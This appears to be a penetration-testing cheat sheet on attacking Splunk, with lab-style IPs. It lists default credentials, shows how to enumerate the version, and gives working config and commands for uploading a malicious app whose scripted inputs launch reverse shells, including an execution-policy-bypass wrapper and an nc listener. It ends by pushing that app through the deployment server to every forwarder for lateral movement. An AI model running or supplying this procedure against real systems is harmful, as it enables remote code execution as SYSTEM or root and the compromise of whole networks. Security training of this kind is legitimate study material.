# Splunk Assessment & Exploitation
**Concept:** Splunk is a data collection and analysis platform. It is highly valued by attackers because it typically runs as a high-privileged user (often `SYSTEM` on Windows or `root` on Linux) and features built-in "Scripted Inputs" that allow for arbitrary code execution if administrative access is obtained. 
**Attack Surface:** Default Credentials, Malicious App Uploads, Deployment Server manipulation (Lateral Movement).
## 1. Discovery & Footprinting
**Goal:** Identify active Splunk instances and version information.
### Web Interface Discovery
Splunk's web interface runs by default on port **8000**.
- **Indicators:** The page title typically contains "Splunk" and the login panel is distinct.
- **Default Credentials:**
    - Older versions: `admin:changeme`
    - Newer versions: Credentials set during install, but frequently weak (e.g., `admin:Password123`, `admin:admin`).        
### Version Enumeration (Passive/Active)
Splunk versioning can sometimes be leaked via the `version` string in the login page source or via specific API endpoints.
```shell
# Description: Extract version information from the Splunk login page
# Syntax: curl -s http://<IP>:8000/en-US/account/login | grep -oP '(?<=version=)[^"]+'
curl -s http://10.129.201.50:8000/en-US/account/login | grep "version"
```
## 2. Exploitation: Authenticated RCE (Malicious App)
**Goal:** Achieve Remote Code Execution (RCE) by uploading a custom "app" that leverages scripted inputs. 
**Mechanism:** Splunk apps can contain scripts in the `bin/` directory that execute on a schedule defined in `default/inputs.conf`.
### Step 1: Weaponization (Payload Construction)
Create a directory structure for the malicious app.
```shell
# Description: Setup the directory structure for a malicious Splunk app
mkdir -p splunk_shell/bin
mkdir -p splunk_shell/default
```

**Payloads:**
- **Windows (run.ps1):** Use a PowerShell reverse shell one-liner.
- **Linux (rev.py):** Use a Python reverse shell snippet.
- **Wrapper (run.bat - Windows Only):** Necessary to bypass execution policies.
```powershell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
### Step 2: Configuration (`inputs.conf`)
Define the scripted input to trigger the payload.
```ini
# Path: splunk_shell/default/inputs.conf
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
### Step 3: Packaging
Splunk expects apps as `.tar.gz` or `.spl` files.
```shell
# Description: Package the malicious app for upload
# Syntax: tar -cvzf <app_name>.tar.gz <folder_name>/
tar -cvzf updater.tar.gz splunk_shell/
```
### Step 4: Execution
1. Start a listener on the attack box: `nc -lvnp 443`. 
2. Navigate to **Apps** -> **Manage Apps** -> **Install app from file**.
3. Upload `updater.tar.gz`.
4. **OPSEC Warning:** Splunk will run the script every `interval` seconds (e.g., 10s). This will spawn multiple shell processes if not handled correctly. Stop the app once access is stabilized.
## 3. Lateral Movement: Universal Forwarder Hijacking
**Concept:** If the compromised Splunk instance acts as a **Deployment Server**, it can push the malicious app to all connected **Universal Forwarders** (UFs) in the network.
### Execution
1. Copy the malicious app to the deployment directory:
```shell
# Description: Place app in the deployment-apps directory
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
```
2. Trigger a server reload to push the app:
```shell
# Description: Force Splunk to push new apps to forwarders
/opt/splunk/bin/splunk reload deploy-server
```
3. **Result:** You will receive reverse shells from every managed host (Servers, Workstations) phoning home to the deployment server.